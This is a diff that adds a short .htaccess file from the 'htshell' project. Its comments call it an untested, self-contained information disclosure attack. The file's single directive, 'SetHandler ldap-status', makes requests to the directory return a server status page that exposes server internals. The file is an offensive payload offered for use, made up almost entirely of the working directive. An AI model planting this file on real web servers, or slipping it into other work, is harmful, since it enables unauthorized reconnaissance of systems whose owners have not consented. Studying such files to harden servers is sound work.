@@ -1,0 +1,6 @@
+# Untested 
+# Self contained .htaccess information disclosure attack - Part of the htshell project
+# Written by Wireghoul - http://www.justanotherhacker.com
+# # This file will make any request to the parent directory return a server status page
+# The file does not have to exist for this to work
+SetHandler ldap-status
